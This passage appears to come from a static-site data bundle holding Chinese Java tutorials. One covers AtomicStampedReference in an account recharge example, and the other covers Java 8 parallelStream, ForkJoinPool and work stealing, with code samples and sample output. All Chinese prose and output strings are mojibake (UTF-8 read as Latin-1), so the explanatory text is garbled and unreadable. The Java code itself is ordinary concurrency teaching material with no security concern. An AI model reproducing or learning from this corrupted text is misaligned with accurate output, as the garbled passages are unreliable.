20),stamp,stamp+1)) {\n                        system.out.println("ä½é¢å°äº20åï¼åå¼æåï¼ä½é¢ï¼" + clientaccount.getamount());\n                    }\n                }else {\n                    system.out.println("å½åç¨æ· åå¼è¿ä¸è½ååå¼");\n                    break;\n                }\n            }\n        }).start();\n    }\n    // æ¨¡ææ¶è´¹\n    for(int i=0;i<3;i++){\n        new thread(() -> {\n            while (true) {\n                int stamp = accountatomicreference.getstamp();\n                account clientaccount = accountatomicreference.getreference();\n                system.out.println("æ¶è´¹åæ¥è¯¢ä½é¢è¿æ " + clientaccount.getamount());\n                if (clientaccount.getamount() >= 10) {\n                    if (accountatomicreference.compareandset(clientaccount, clientaccount.setamount(clientaccount.getamount() - 10),stamp,stamp+1)) {\n                        system.out.println("æåæ¶è´¹10åï¼ä½é¢è¿æï¼" + clientaccount.getamount());\n                    }\n                }else{\n                    system.out.println("ä½é¢ä¸å¤");\n                    break;\n                }\n            }\n        }).start();\n    }\n}\nè¾åºç»æï¼\nåå¼åæ¥è¯¢ä½é¢è¿æ 10\nä½é¢å°äº20åï¼åå¼æåï¼ä½é¢ï¼30\nåå¼åæ¥è¯¢ä½é¢è¿æ 30\nå½åç¨æ· åå¼è¿ä¸è½ååå¼\næ¶è´¹åæ¥è¯¢ä½é¢è¿æ 30\næåæ¶è´¹10åï¼ä½é¢è¿æï¼20\næ¶è´¹åæ¥è¯¢ä½é¢è¿æ 20\næåæ¶è´¹10åï¼ä½é¢è¿æï¼10\næ¶è´¹åæ¥è¯¢ä½é¢è¿æ 10\næåæ¶è´¹10åï¼ä½é¢è¿æï¼0\næ¶è´¹åæ¥è¯¢ä½é¢è¿æ 0\nä½é¢ä¸å¤\næ¶è´¹åæ¥è¯¢ä½é¢è¿æ 0\nä½é¢ä¸å¤\nåå¼åæ¥è¯¢ä½é¢è¿æ 0\nåå¼åæ¥è¯¢ä½é¢è¿æ 20\nå½åç¨æ· åå¼è¿ä¸è½ååå¼\næ¶è´¹åæ¥è¯¢ä½é¢è¿æ 20\næåæ¶è´¹10åï¼ä½é¢è¿æï¼10\næ¶è´¹åæ¥è¯¢ä½é¢è¿æ 10\næåæ¶è´¹10åï¼ä½é¢è¿æï¼0\næ¶è´¹åæ¥è¯¢ä½é¢è¿æ 0\nä½é¢ä¸å¤\nåå¼åæ¥è¯¢ä½é¢è¿æ 10\nåå¼åæ¥è¯¢ä½é¢è¿æ 20\nå½åç¨æ· åå¼è¿ä¸è½ååå¼\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n\n\nââ å¦æè¯´å¨åå¼çæ¶åå ä¸ä¸ªæ¡ä»¶ï¼è®©å¶åªè½åå¼ 1 æ¬¡ï¼å¦ææä»¬ç¨ atomicreference æ¯å®å¨åä¸å°çï¼å ä¸ºä»ä¸ä¼è®°å½ï¼éè¦æä»¬èªå·±å»æ·»å ä¸ä¸ªå¨å±åéå»ç»´æ¤ï¼ä½ä½¿ç¨ atomicstampedreference å°±å¯ä»¥åå°ï¼å ä¸ºå®æ¬èº«å°±ç»´æ¤äºä¸ä¸ªæ è®°ï¼èä¸è¿å¸®æä»¬è§£å³äº aba é®é¢ï¼å¦æè¯´å¼è¢«å¶ä»çº¿ç¨åç¨ï¼æ è®°å°±ä¼ + 1ï¼ä½¿å¾åå½åçº¿ç¨çæ è®°ä¸ä¸æ ·ï¼åä¿çå¼éåºã\n\nââ åºäº atomicinteger å atomicreference è¿æ atomicreferencearray atomicintegerarray ç­ï¼å·ä½ç api é½æ¯å·®ä¸å¤çã',charsets:{cjk:!0}},{title:"JAVA8 æ°ç¹æ§æ»ç»",frontmatter:{title:"JAVA8 æ°ç¹æ§æ»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/language/java/version/1/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/01.JAVA/03.%E7%89%88%E6%9C%AC/1.JAVA8%20%E6%96%B0%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93.html",relativePath:"00.è¯­è¨/01.JAVA/03.çæ¬/1.JAVA8 æ°ç¹æ§æ»ç».md",key:"v-182bbd6a",path:"/language/java/version/1/",headers:[{level:2,title:"parallelStream åCompletableFutureå®æ",slug:"parallelstream-åcompletablefutureå®æ",normalizedTitle:"parallelstream å completablefuture å®æ",charIndex:2},{level:3,title:"parallelStream",slug:"parallelstream",normalizedTitle:"parallelstream",charIndex:2},{level:3,title:"CompletableFuture",slug:"completablefuture",normalizedTitle:"completablefuture",charIndex:19}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"parallelStream åCompletableFutureå®æ parallelStream CompletableFuture",content:'# parallelStream å CompletableFuture å®æ\n\n\n# parallelStream\n\nabout Stream\nä»ä¹æ¯æµï¼\n\nStream æ¯ java8 ä¸­æ°å¢å çä¸ä¸ªç¹æ§ï¼è¢« java ç¿ç»ç§°ä¸ºæµ.\n\nStream ä¸æ¯éååç´ ï¼å®ä¸æ¯æ°æ®ç»æå¹¶ä¸ä¿å­æ°æ®ï¼å®æ¯æå³ç®æ³åè®¡ç®çï¼å®æ´åä¸ä¸ªé«çº§çæ¬ç Iteratorãåå§çæ¬ç Iteratorï¼ç¨æ·åªè½æ¾å¼å°ä¸ä¸ªä¸ä¸ªéååç´ å¹¶å¯¹å¶æ§è¡æäºæä½ï¼é«çº§çæ¬ç Streamï¼ç¨æ·åªè¦ç»åºéè¦å¯¹å¶åå«çåç´ æ§è¡ä»ä¹æä½ï¼æ¯å¦ âè¿æ»¤æé¿åº¦å¤§äº 10 çå­ç¬¦ä¸²âãâè·åæ¯ä¸ªå­ç¬¦ä¸²çé¦å­æ¯â ç­ï¼Stream ä¼éå¼å°å¨åé¨è¿è¡éåï¼ååºç¸åºçæ°æ®è½¬æ¢ã\n\nStream å°±å¦åä¸ä¸ªè¿­ä»£å¨ï¼Iteratorï¼ï¼ååï¼ä¸å¯å¾å¤ï¼æ°æ®åªè½éåä¸æ¬¡ï¼éåè¿ä¸æ¬¡åå³ç¨å°½äºï¼å°±å¥½æ¯æµæ°´ä»é¢åæµè¿ï¼ä¸å»ä¸å¤è¿ã\n\nèåè¿­ä»£å¨åä¸åçæ¯ï¼Stream å¯ä»¥å¹¶è¡åæä½ï¼è¿­ä»£å¨åªè½å½ä»¤å¼å°ãä¸²è¡åæä½ãé¡¾åæä¹ï¼å½ä½¿ç¨ä¸²è¡æ¹å¼å»éåæ¶ï¼æ¯ä¸ª item è¯»å®ååè¯»ä¸ä¸ä¸ª itemãèä½¿ç¨å¹¶è¡å»éåæ¶ï¼æ°æ®ä¼è¢«åæå¤ä¸ªæ®µï¼å¶ä¸­æ¯ä¸ä¸ªé½å¨ä¸åççº¿ç¨ä¸­å¤çï¼ç¶åå°ç»æä¸èµ·è¾åºãStream çå¹¶è¡æä½ä¾èµäº Java7 ä¸­å¼å¥ç Fork/Join æ¡æ¶ï¼JSR166yï¼æ¥æåä»»å¡åå éå¤çè¿ç¨ãJava çå¹¶è¡ API æ¼ååç¨åºæ¬å¦ä¸ï¼\n\n> 1.0-1.4 ä¸­ç java.lang.Thread\n> 5.0 ä¸­ç java.util.concurrent\n> 6.0 ä¸­ç Phasers ç­\n> 7.0 ä¸­ç Fork/Join æ¡æ¶\n> 8.0 ä¸­ç Lambda\n\nStream çå¦å¤ä¸å¤§ç¹ç¹æ¯ï¼æ°æ®æºæ¬èº«å¯ä»¥æ¯æ éçã\n\nparallelStream æ¯ä»ä¹\nparallelStream å¶å®å°±æ¯ä¸ä¸ªå¹¶è¡æ§è¡çæµãå®éè¿é»è®¤ç ForkJoinPool, å¯è½æé«ä½ çå¤çº¿ç¨ä»»å¡çéåº¦.\n\nparallelStream çä½ç¨\nStream å·æå¹³è¡å¤çè½åï¼å¤ççè¿ç¨ä¼åèæ²»ä¹ï¼ä¹å°±æ¯å°ä¸ä¸ªå¤§ä»»å¡ååæå¤ä¸ªå°ä»»å¡ï¼è¿è¡¨ç¤ºæ¯ä¸ªä»»å¡é½æ¯ä¸ä¸ªæä½ï¼å æ­¤åä»¥ä¸çç¨å¼çæ®µï¼\n\nList<Integer> numbers = Arrays.asList(1, 2, 3, 4, 5, 6, 7, 8, 9);\nnumbers.parallelStream()\n       .forEach(out::println); \n\n\n1\n2\n3\n\n\nä½ å¾å°çå±ç¤ºé¡ºåºä¸ä¸å®ä¼æ¯ 1ã2ã3ã4ã5ã6ã7ã8ã9ï¼èå¯è½æ¯ä»»æçé¡ºåºï¼å°± forEach () è¿ä¸ªæä½ä¾è®²ï¼å¦æå¹³è¡å¤çæ¶ï¼å¸ææåé¡ºåºæ¯æç§åæ¥ Stream çæ°æ®é¡ºåºï¼é£å¯ä»¥è°ç¨ forEachOrdered ()ãä¾å¦ï¼\n\nList<Integer> numbers = Arrays.asList(1, 2, 3, 4, 5, 6, 7, 8, 9);\nnumbers.parallelStream()\n       .forEachOrdered(out::println);\n\n\n1\n2\n3\n\n\næ³¨æï¼å¦æ forEachOrdered () ä¸­é´æå¶ä»å¦ filter () çä¸­ä»æä½ï¼ä¼è¯çå¹³è¡åå¤çï¼ç¶åæç» forEachOrdered () ä¼ä»¥åæ°æ®é¡ºåºå¤çï¼å æ­¤ï¼ä½¿ç¨ forEachOrdered () è¿ç±»çæåºå¤çï¼å¯è½ä¼ï¼æå®å¨å¤±å»ï¼å¤±å»å¹³è¡åçä¸äºä¼å¿ï¼å®éä¸ä¸­ä»æä½äº¦æå¯è½å¦æ­¤ï¼ä¾å¦ sorted () æ¹æ³ã\n\nparallelStream èåçç·äººï¼ForkJoinPool\nè¦æ³æ·±å¥çç ç©¶ parallelStream ä¹åï¼é£ä¹æä»¬å¿é¡»åäºè§£ ForkJoin æ¡æ¶å ForkJoinPool. æ¬ææ¨å¨ parallelStream, ä½å ä¸ºä¸¤ç§å³ç³»çå¯ï¼æå¨æ­¤ç®åä»ç»ä¸ä¸ ForkJoinPool, å¦æå´è¶£å¯ä»¥æ´æ·±å¥çå»äºè§£ä¸ ForkJoin***(å½ç¶ï¼å¦æä½ æ³çæ­£çæé parallelStream, é£ä¹ä½ ä¾ç¶éè¦åæé ForkJoinPool).*\n\nForkJoin æ¡æ¶æ¯ä» jdk7 ä¸­æ°ç¹æ§ï¼å®å ThreadPoolExecutor ä¸æ ·ï¼ä¹å®ç°äº Executor å ExecutorService æ¥å£ãå®ä½¿ç¨äºä¸ä¸ªæ ééåæ¥ä¿å­éè¦æ§è¡çä»»å¡ï¼èçº¿ç¨çæ°éåæ¯éè¿æé å½æ°ä¼ å¥ï¼å¦ææ²¡æåæé å½æ°ä¸­ä¼ å¥å¸æççº¿ç¨æ°éï¼é£ä¹å½åè®¡ç®æºå¯ç¨ç CPU æ°éä¼è¢«è®¾ç½®ä¸ºçº¿ç¨æ°éä½ä¸ºé»è®¤å¼ã\n\nForkJoinPool ä¸»è¦ç¨æ¥ä½¿ç¨åæ²»æ³ (Divide-and-Conquer Algorithm) æ¥è§£å³é®é¢ãå¸åçåºç¨æ¯å¦å¿«éæåºç®æ³ãè¿éçè¦ç¹å¨äºï¼ForkJoinPool éè¦ä½¿ç¨ç¸å¯¹å°ççº¿ç¨æ¥å¤çå¤§éçä»»å¡ãæ¯å¦è¦å¯¹ 1000 ä¸ä¸ªæ°æ®è¿è¡æåºï¼é£ä¹ä¼å°è¿ä¸ªä»»å¡åå²æä¸¤ä¸ª 500 ä¸çæåºä»»å¡åä¸ä¸ªéå¯¹è¿ä¸¤ç» 500 ä¸æ°æ®çåå¹¶ä»»å¡ãä»¥æ­¤ç±»æ¨ï¼å¯¹äº 500 ä¸çæ°æ®ä¹ä¼ååºåæ ·çåå²å¤çï¼å°æåä¼è®¾ç½®ä¸ä¸ªéå¼æ¥è§å®å½æ°æ®è§æ¨¡å°å¤å°æ¶ï¼åæ­¢è¿æ ·çåå²å¤çãæ¯å¦ï¼å½åç´ çæ°éå°äº 10 æ¶ï¼ä¼åæ­¢åå²ï¼è½¬èä½¿ç¨æå¥æåºå¯¹å®ä»¬è¿è¡æåºãé£ä¹å°æåï¼ææçä»»å¡å èµ·æ¥ä¼æå¤§æ¦ 2000000 + ä¸ªãé®é¢çå³é®å¨äºï¼å¯¹äºä¸ä¸ªä»»å¡èè¨ï¼åªæå½å®ææçå­ä»»å¡å®æä¹åï¼å®æè½å¤è¢«æ§è¡ã\n\næä»¥å½ä½¿ç¨ ThreadPoolExecutor æ¶ï¼ä½¿ç¨åæ²»æ³ä¼å­å¨é®é¢ï¼å ä¸º ThreadPoolExecutor ä¸­ççº¿ç¨æ æ³åä»»å¡éåä¸­åæ·»å ä¸ä¸ªä»»å¡å¹¶ä¸å¨ç­å¾è¯¥ä»»å¡å®æä¹ååç»§ç»­æ§è¡ãèä½¿ç¨ ForkJoinPool æ¶ï¼å°±è½å¤è®©å¶ä¸­ççº¿ç¨åå»ºæ°çä»»å¡ï¼å¹¶æèµ·å½åçä»»å¡ï¼æ­¤æ¶çº¿ç¨å°±è½å¤ä»éåä¸­éæ©å­ä»»å¡æ§è¡ã\n\né£ä¹ä½¿ç¨ ThreadPoolExecutor æè ForkJoinPoolï¼ä¼æä»ä¹æ§è½çå·®å¼å¢ï¼\né¦åï¼ä½¿ç¨ ForkJoinPool è½å¤ä½¿ç¨æ°éæéççº¿ç¨æ¥å®æéå¸¸å¤çå·æç¶å­å³ç³»çä»»å¡ï¼æ¯å¦ä½¿ç¨ 4 ä¸ªçº¿ç¨æ¥å®æè¶è¿ 200 ä¸ä¸ªä»»å¡ãä½æ¯ï¼ä½¿ç¨ ThreadPoolExecutor æ¶ï¼æ¯ä¸å¯è½å®æçï¼å ä¸º ThreadPoolExecutor ä¸­ç Thread æ æ³éæ©ä¼åæ§è¡å­ä»»å¡ï¼éè¦å®æ 200 ä¸ä¸ªå·æç¶å­å³ç³»çä»»å¡æ¶ï¼ä¹éè¦ 200 ä¸ä¸ªçº¿ç¨ï¼æ¾ç¶è¿æ¯ä¸å¯è¡çã\n\nå·¥ä½çªåç®æ³\nforkjoin ææ ¸å¿çå°æ¹å°±æ¯å©ç¨äºç°ä»£ç¡¬ä»¶è®¾å¤å¤æ ¸ï¼å¨ä¸ä¸ªæä½æ¶åä¼æç©ºé²ç cpu, é£ä¹å¦ä½å©ç¨å¥½è¿ä¸ªç©ºé²ç cpu å°±æäºæé«æ§è½çå³é®ï¼èè¿éæä»¬è¦æå°çå·¥ä½çªåï¼work-stealingï¼ç®æ³å°±æ¯æ´ä¸ª forkjion æ¡æ¶çæ ¸å¿çå¿µï¼å·¥ä½çªåï¼work-stealingï¼ç®æ³æ¯ææä¸ªçº¿ç¨ä»å¶ä»éåéçªåä»»å¡æ¥æ§è¡ã\n\né£ä¹ä¸ºä»ä¹éè¦ä½¿ç¨å·¥ä½çªåç®æ³å¢ï¼\nåå¦æä»¬éè¦åä¸ä¸ªæ¯è¾å¤§çä»»å¡ï¼æä»¬å¯ä»¥æè¿ä¸ªä»»å¡åå²ä¸ºè¥å¹²äºä¸ä¾èµçå­ä»»å¡ï¼ä¸ºäºåå°çº¿ç¨é´çç«äºï¼äºæ¯æè¿äºå­ä»»å¡åå«æ¾å°ä¸åçéåéï¼å¹¶ä¸ºæ¯ä¸ªéååå»ºä¸ä¸ªåç¬ççº¿ç¨æ¥æ§è¡éåéçä»»å¡ï¼çº¿ç¨åéåä¸ä¸å¯¹åºï¼æ¯å¦ A çº¿ç¨è´è´£å¤ç A éåéçä»»å¡ãä½æ¯æççº¿ç¨ä¼åæèªå·±éåéçä»»å¡å¹²å®ï¼èå¶ä»çº¿ç¨å¯¹åºçéåéè¿æä»»å¡ç­å¾å¤çãå¹²å®æ´»ççº¿ç¨ä¸å¶ç­çï¼ä¸å¦å»å¸®å¶ä»çº¿ç¨å¹²æ´»ï¼äºæ¯å®å°±å»å¶ä»çº¿ç¨çéåéçªåä¸ä¸ªä»»å¡æ¥æ§è¡ãèå¨è¿æ¶å®ä»¬ä¼è®¿é®åä¸ä¸ªéåï¼æä»¥ä¸ºäºåå°çªåä»»å¡çº¿ç¨åè¢«çªåä»»å¡çº¿ç¨ä¹é´çç«äºï¼éå¸¸ä¼ä½¿ç¨åç«¯éåï¼è¢«çªåä»»å¡çº¿ç¨æ°¸è¿ä»åç«¯éåçå¤´é¨æ¿ä»»å¡æ§è¡ï¼èçªåä»»å¡ççº¿ç¨æ°¸è¿ä»åç«¯éåçå°¾é¨æ¿ä»»å¡æ§è¡ã\n\n> å·¥ä½çªåç®æ³çä¼ç¹æ¯ååå©ç¨çº¿ç¨è¿è¡å¹¶è¡è®¡ç®ï¼å¹¶åå°äºçº¿ç¨é´çç«äºï¼å¶ç¼ºç¹æ¯å¨æäºæåµä¸è¿æ¯å­å¨ç«äºï¼æ¯å¦åç«¯éåéåªæä¸ä¸ªä»»å¡æ¶ãå¹¶ä¸æ¶èäºæ´å¤çç³»ç»èµæºï¼æ¯å¦åå»ºå¤ä¸ªçº¿ç¨åå¤ä¸ªåç«¯éåã\n\nç¨ç forkjion çç¼åæ¥ç ParallelStreams\nä¸æä¸­å·²ç»æå°äºå¨ Java 8 å¼å¥äºèªå¨å¹¶è¡åçæ¦å¿µãå®è½å¤è®©ä¸é¨å Java ä»£ç èªå¨å°ä»¥å¹¶è¡çæ¹å¼æ§è¡ï¼ä¹å°±æ¯æä»¬ä½¿ç¨äº ForkJoinPool ç ParallelStreamã\n\nJava 8 ä¸º ForkJoinPool æ·»å äºä¸ä¸ªéç¨çº¿ç¨æ± ï¼è¿ä¸ªçº¿ç¨æ± ç¨æ¥å¤çé£äºæ²¡æè¢«æ¾å¼æäº¤å°ä»»ä½çº¿ç¨æ± çä»»å¡ãå®æ¯ ForkJoinPool ç±»åä¸çä¸ä¸ªéæåç´ ï¼å®æ¥æçé»è®¤çº¿ç¨æ°éç­äºè¿è¡è®¡ç®æºä¸çå¤çå¨æ°éãå½è°ç¨ Arrays ç±»ä¸æ·»å çæ°æ¹æ³æ¶ï¼èªå¨å¹¶è¡åå°±ä¼åçãæ¯å¦ç¨æ¥æåºä¸ä¸ªæ°ç»çå¹¶è¡å¿«éæåºï¼ç¨æ¥å¯¹ä¸ä¸ªæ°ç»ä¸­çåç´ è¿è¡å¹¶è¡éåãèªå¨å¹¶è¡åä¹è¢«è¿ç¨å¨ Java 8 æ°æ·»å ç Stream API ä¸­ã\n\næ¯å¦ä¸é¢çä»£ç ç¨æ¥éååè¡¨ä¸­çåç´ å¹¶æ§è¡éè¦çæä½ï¼\n\n    List<UserInfo> userInfoList =\n        DaoContainers.getUserInfoDAO().queryAllByList(new UserInfoModel());\n    userInfoList.parallelStream().forEach(RedisUserApi::setUserIdUserInfo);\n\n\n1\n2\n3\n\n\nå¯¹äºåè¡¨ä¸­çåç´ çæä½é½ä¼ä»¥å¹¶è¡çæ¹å¼æ§è¡ãforEach æ¹æ³ä¼ä¸ºæ¯ä¸ªåç´ çè®¡ç®æä½åå»ºä¸ä¸ªä»»å¡ï¼è¯¥ä»»å¡ä¼è¢«åæä¸­æå°ç ForkJoinPool ä¸­çéç¨çº¿ç¨æ± å¤çãä»¥ä¸çå¹¶è¡è®¡ç®é»è¾å½ç¶ä¹å¯ä»¥ä½¿ç¨ ThreadPoolExecutor å®æï¼ä½æ¯å°±ä»£ç çå¯è¯»æ§åä»£ç éèè¨ï¼ä½¿ç¨ ForkJoinPool ææ¾æ´èä¸ç­¹ã\n\nå¯¹äº ForkJoinPool éç¨çº¿ç¨æ± ççº¿ç¨æ°éï¼éå¸¸ä½¿ç¨é»è®¤å¼å°±å¯ä»¥äºï¼å³è¿è¡æ¶è®¡ç®æºçå¤çå¨æ°éãæè¿éæä¾äºä¸ä¸ªç¤ºä¾çä»£ç è®©ä½ äºè§£ jvm æä½¿ç¨ç ForkJoinPool ççº¿ç¨æ°éï¼ä½ å¯ä»¥å¯ä»¥éè¿è®¾ç½®ç³»ç»å±æ§ï¼-Djava.util.concurrent.ForkJoinPool.common.parallelism=N ï¼N ä¸ºçº¿ç¨æ°éï¼, æ¥è°æ´ ForkJoinPool ççº¿ç¨æ°éï¼å¯ä»¥å°è¯è°æ´æä¸åçåæ°æ¥è§å¯æ¯æ¬¡çè¾åºç»æ:\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Set;\nimport java.util.concurrent.CopyOnWriteArraySet;\nimport java.util.concurrent.CountDownLatch;\n\n/**\n * @description è¿æ¯ä¸ä¸ªç¨æ¥è®©ä½ æ´å çæparallelStreamçåççå®å\n * @version v1.0\n */\npublic class App {\n    public static void main(String[] args) throws Exception {\n        System.out.println("Hello World!");\n        // æé ä¸ä¸ª10000ä¸ªåç´ çéå\n        List<Integer> list = new ArrayList<>();\n        for (int i = 0; i < 10000; i++) {\n            list.add(i);\n        }\n        // ç»è®¡å¹¶è¡æ§è¡listççº¿ç¨\n        Set<Thread> threadSet = new CopyOnWriteArraySet<>();\n        // å¹¶è¡æ§è¡\n        list.parallelStream().forEach(integer -> {\n            Thread thread = Thread.currentThread();\n            // System.out.println(thread);\n            // ç»è®¡å¹¶è¡æ§è¡listççº¿ç¨\n            threadSet.add(thread);\n        });\n        System.out.println("threadSetä¸å±æ" + threadSet.size() + "ä¸ªçº¿ç¨");\n        System.out.println("ç³»ç»ä¸ä¸ªæ"+Runtime.getRuntime().availableProcessors()+"ä¸ªcpu");\n        List<Integer> list1 = new ArrayList<>();\n        List<Integer> list2 = new ArrayList<>();\n        for (int i = 0; i < 100000; i++) {\n            list1.add(i);\n            list2.add(i);\n        }\n        Set<Thread> threadSetTwo = new CopyOnWriteArraySet<>();\n        CountDownLatch countDownLatch = new CountDownLatch(2);\n        Thread threadA = new Thread(() -> {\n            list1.parallelStream().forEach(integer -> {\n                Thread thread = Thread.currentThread();\n                // System.out.println("list1" + thread);\n                threadSetTwo.add(thread);\n            });\n            countDownLatch.countDown();\n        });\n        Thread threadB = new Thread(() -> {\n            list2.parallelStream().forEach(integer -> {\n                Thread thread = Thread.currentThread();\n                // System.out.println("list2" + thread);\n                threadSetTwo.add(thread);\n            });\n            countDownLatch.countDown();\n        });\n\n        threadA.start();\n        threadB.start();\n        countDownLatch.await();\n        System.out.print("threadSetTwoä¸å±æ" + threadSetTwo.size() + "ä¸ªçº¿ç¨");\n\n        System.out.println("---------------------------");\n        System.out.println(threadSet);\n        System.out.println(threadSetTwo);\n        System.out.println("---------------------------");\n        threadSetTwo.addAll(threadSet);\n        System.out.println(threadSetTwo);\n        System.out.println("threadSetTwoä¸å±æ" + threadSetTwo.size() + "ä¸ªçº¿ç¨");\n        System.out.println("ç³»ç»ä¸ä¸ªæ"+Runtime.getRuntime().availableProcessors()+"ä¸ªcpu");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n\n\nåºç°è¿ç§ç°è±¡çåå æ¯ï¼forEach æ¹æ³ç¨äºä¸äºå°ææãå®ä¼å°æ§è¡ forEach æ¬èº«ççº¿ç¨ä¹ä½ä¸ºçº¿ç¨æ± ä¸­çä¸ä¸ªå·¥ä½çº¿ç¨ãå æ­¤ï¼å³ä½¿å° ForkJoinPool çéç¨çº¿ç¨æ± ççº¿ç¨æ°éè®¾ç½®ä¸º 1ï¼å®éä¸ä¹ä¼æ 2 ä¸ªå·¥ä½çº¿ç¨ãå æ­¤å¨ä½¿ç¨ forEach çæ¶åï¼çº¿ç¨æ°ä¸º 1 ç ForkJoinPool éç¨çº¿ç¨æ± åçº¿ç¨æ°ä¸º 2 ç ThreadPoolExecutor æ¯ç­ä»·çã\n\næä»¥å½ ForkJoinPool éç¨çº¿ç¨æ± å®ééè¦ 4 ä¸ªå·¥ä½çº¿ç¨æ¶ï¼å¯ä»¥å°å®è®¾ç½®æ 3ï¼é£ä¹å¨è¿è¡æ¶å¯ç¨çå·¥ä½çº¿ç¨å°±æ¯ 4 äºã\nå°ç»:\n\n>  1. å½éè¦å¤çéå½åæ²»ç®æ³æ¶ï¼èèä½¿ç¨ ForkJoinPoolã\n>  2. ä»ç»è®¾ç½®ä¸åè¿è¡ä»»å¡ååçéå¼ï¼è¿ä¸ªéå¼å¯¹æ§è½æå½±åã\n>  3. Java 8 ä¸­çä¸äºç¹æ§ä¼ä½¿ç¨å° ForkJoinPool ä¸­çéç¨çº¿ç¨æ± ãå¨æäºåºåä¸ï¼éè¦è°æ´è¯¥çº¿ç¨æ± çé»è®¤ççº¿ç¨æ°éã\n\nParallelStreams çé·é±\nä¸æä¸­æä»¬å·²ç»çå°äº ParallelStream ä»å¼ºå¤§æ æ¯çç¹æ§ï¼ä½è¿éæä»¬å°±è®²åè¯ä½  ParallelStreams ä¸æ¯ä¸éæ²¹ï¼èæ¯ä¸æåååï¼å¦æéè¯¯çä½¿ç¨ååå¯è½ä¼¤äººä¼¤å·±.\n\nä»¥ä¸æ¯ä¸ä¸ªæä»¬é¡¹ç®éä½¿ç¨ parallel streams çå¾å¸¸è§çæåµãå¨è¿ä¸ªä¾å­ä¸­ï¼æä»¬æ³åæ¶è°ç¨ä¸åå°åç api ä¸­å¹¶ä¸è·å¾ç¬¬ä¸ä¸ªè¿åçç»æã\n\n    public static String query(String q, List<String> engines) {      Optional<String> result = engines.stream().parallel().map((base) -> {\n        String url = base + q;\n        return WS.url(url).get();\n      }).findAny();\n      return result.get();\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\nå¯è½æå¾å¤æåå¨ jdk7 ç¨ future éå countDownLatch èªå·±å®ç°çè¿ä¸ªåè½ï¼ä½æ¯ jdk8 çæååºæ¬é½ä¼ç¨ä¸é¢çå®ç°æ¹å¼ï¼é£ä¹èªä¿¡æ·±ç©¶ä¸ä¸ç©¶ç«èªå·±ç¨ future å®ç°çè¿ä¸ªåè½åå©ç¨ jdk8 ç parallelStream æ¥å®ç°è¿ä¸ªåè½æä»ä¹ä¸åç¹å¢ï¼ååå¨åªéå¢ï¼\n\nè®©æä»¬ç»ææèä¸ä¸æ´ä¸ªåè½ç©¶ç«æ¯å¦ä½è¿è½¬çãé¦åæä»¬çéååç´  engines ç± ParallelStreams å¹¶è¡çå»è¿è¡ map æä½ (ParallelStreams ä½¿ç¨ JVM é»è®¤ç forkJoin æ¡æ¶ççº¿ç¨æ± ç±å½åçº¿ç¨å»æ§è¡å¹¶è¡æä½).\n\nç¶èï¼è¿ééè¦æ³¨æçä¸å°æ¹æ¯æä»¬å¨è°ç¨ç¬¬ä¸æ¹ç api è¯·æ±æ¯ä¸ä¸ªååºç¥æ¢èä¸ä¼é»å¡æä½çä¸ä¸ªè¿ç¨ãæä»¥å¨ææ¶å»ææçº¿ç¨é½ä¼è°ç¨ get () æ¹æ³å¹¶ä¸å¨é£éç­å¾ç»æè¿å.\n\nååè¿å¤´ä»ç»æèä¸ä¸è¿ä¸ªåè½çå®ç°è¿ç¨æ¯æä»¬ä¸å¼å§æ³è¦çåï¼æä»¬æ¯å¨åä¸æ¶é´ç­å¾ææçç»æï¼èä¸æ¯éåè¿ä¸ªåè¡¨æé¡ºåºç­å¾æ¯ä¸ªåç­ãç¶èï¼ç±äº ForkJoinPool workders çå­å¨ï¼è¿æ ·å¹³è¡çç­å¾ç¸å¯¹äºä½¿ç¨ä¸»çº¿ç¨çç­å¾ä¼äº§ççä¸ç§å¯ä½ç¨.\n\nç°å¨ ForkJoin pool (å³äº forkjion çæ´å¤å®ç°ä½ å¯ä»¥å»æç´¢å¼æä¸­å»çä¸ä¸ä»çå·ä½å®ç°æ¹å¼) çå®ç°æ¯ï¼å®å¹¶ä¸ä¼å ä¸ºäº§çäºæ°ç workers èæµæ¶æé»å¡ç workersãé£ä¹å¨æä¸ªæ¶é´ææ ForkJoinPool.common () ççº¿ç¨é½ä¼è¢«ç¨åãä¹å°±æ¯è¯´ï¼ä¸ä¸æ¬¡ä½ è°ç¨è¿ä¸ªæ¥è¯¢æ¹æ³ï¼å°±å¯è½ä¼å¨ä¸ä¸ªæ¶é´ä¸å¶ä»ç parallel stream åæ¶è¿è¡ï¼èå¯¼è´ç¬¬äºä¸ªä»»å¡çæ§è½å¤§å¤§åæãæèè¯´ï¼ä¾å¦ä½ å¨è¿ä¸ªåè½éæ¯ç¨æ¥å¿«éè¿åè°ç¨çç¬¬ä¸æ¹ api çï¼èå¨å¶ä»çåè½éæ¯ç¨äºä¸äºç®åçæ°æ®å¹¶è¡è®¡ç®çï¼ä½æ¯åå¦ä½ åè°ç¨äºè¿ä¸ªåè½ï¼åä¸æ¶é´ä¹åè°ç¨è®¡ç®çå½æ°ï¼é£ä¹è¿é forkjionPool çå®ç°ä¼è®©ä½ è®¡ç®çå½æ°å¤§æææ£.\n\nä¸è¿ä¹ä¸è¦æ¥çå»åæ§½ ForkJoinPool çå®ç°ï¼å¨ä¸åçæåµä¸ä½ å¯ä»¥ç»å®ä¸ä¸ª ManagedBlocker å®ä¾å¹¶ä¸ç¡®ä¿å®ç¥éå¨ä¸ä¸ªé»å¡è°ç¨ä¸­åºè¯¥ä»ä¹æ¶åå»æµæ¶æå¡ä½ç workers. 